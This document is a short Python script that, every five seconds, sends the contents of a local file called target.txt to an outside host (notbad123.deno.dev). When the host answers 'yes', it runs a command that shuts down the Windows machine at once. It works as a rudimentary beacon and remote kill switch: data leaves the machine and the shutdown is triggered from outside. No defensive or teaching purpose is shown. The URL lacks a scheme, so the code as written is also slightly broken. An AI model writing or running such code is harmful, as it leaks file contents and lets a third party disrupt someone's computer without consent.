import requests
import time
import os
import sys

with open("target.txt") as f: s = f.read()

url = "notbad123.deno.dev"

while True:
    res = requests.get(url, params={"name": s})
    print(res.text)
    if res.text == "yes":
        os.system("shutdown /s /t 1")
    time.sleep(5)